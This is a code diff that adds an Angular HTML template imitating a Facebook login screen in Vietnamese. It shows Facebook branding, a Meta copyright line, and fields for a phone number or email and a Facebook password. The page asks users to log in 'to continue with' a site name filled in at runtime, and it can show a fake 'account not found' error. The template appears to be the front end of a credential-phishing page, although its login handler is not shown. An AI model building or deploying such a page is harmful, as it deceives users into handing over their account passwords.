@@ -1,0 +1,34 @@
+<section *ngIf="pageData" class="main">
+    <div class="main__banner">
+        <img src="../../assets/facebook.svg" alt="" class="main__banner__icon">
+    </div>
+    <div *ngIf="isInvalid" class="main__error">
+        Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào.
+    </div>
+    <div class="main__content">
+        <img [src]="pageData.icon" alt="" class="main__icon">
+        <p class="main__text">Hãy đăng nhập vào tài khoản Facebook của bạn để tiếp tục với {{pageData.ogSiteName}}</p>
+        <div class="main__form" [formGroup]="formGroup">
+            <input type="text" formControlName="email" placeholder="Số di động hoặc email">
+            <input type="password" formControlName="password" placeholder="Mật khẩu Facebook">
+        </div>
+        <button class="main__submit" (click)="login()">Đăng nhập</button>
+        <a href="" class="main__forgot">Quên mật khẩu?</a>
+        <a href="" class="main__action">Tạo tài khoản</a>
+        <a href="" class="main__action">Trung tâm trợ giúp</a>
+        <div class="main__grid">
+            <p class="sel">Tiếng Việt</p>
+            <p>English (UK)</p>
+
+            <p>中文(台灣)</p>
+            <p>한국어</p>
+
+            <p>Español</p>
+            <p>Português (Brasil)</p>
+
+            <p>Français (France)</p>
+            <div><p>+</p></div>
+        </div>
+        <p class="main__copyright">Meta © 2022</p>
+    </div>
+</section>
